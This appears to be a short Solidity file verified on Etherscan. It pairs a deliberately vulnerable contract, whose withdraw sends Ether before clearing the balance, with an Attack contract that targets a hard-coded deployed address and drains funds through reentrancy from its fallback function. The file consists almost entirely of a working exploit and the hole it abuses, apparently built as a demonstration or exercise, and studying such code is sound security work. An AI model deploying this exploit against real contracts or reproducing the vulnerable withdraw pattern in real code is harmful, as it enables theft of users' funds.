/**
 *Submitted for verification at Etherscan.io on 2021-12-07
*/

pragma solidity ^0.6.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract Attack {
    address target = 0x36A540E3A78084962B75E25877CfACf8846Be018;

    Vuln v;
    
    address payable owner;
    bool done;

    constructor() public{
        owner = msg.sender;
        v = Vuln(target);
        done = false;
    }

    fallback() external payable {
        if (done == false){
            done = true;
            v.withdraw();
        }
    }

    function attack() public payable{
        done = false;
        v.deposit{value : msg.value}();
        v.withdraw();
        owner.transfer(address(this).balance);
    }
}